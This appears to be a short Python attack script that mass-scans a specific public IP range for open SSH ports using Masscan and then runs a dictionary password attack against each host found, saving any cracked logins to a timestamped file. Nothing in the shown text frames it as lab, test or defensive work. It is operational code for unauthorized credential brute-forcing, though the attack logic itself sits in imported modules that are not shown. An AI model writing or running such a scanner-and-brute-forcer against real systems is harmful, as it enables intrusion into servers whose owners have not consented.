import datetime
from scanner.masscan import Masscan
from _ssh.ssh_client import SSH_Client

if "__main__" == __name__:
    timestamp = datetime.datetime.now().isoformat()

    ips = Masscan.scan("160.251.100.0/24", "22", "1000")

    for i in ips:
        ssh_client = SSH_Client(i["ip"], "22")
        ssh_client.dictionary_attack()

        if ssh_client.result is not None:
            with open(f"result_{timestamp}.txt", "a") as file:
                file.write(ssh_client.result + "\n")
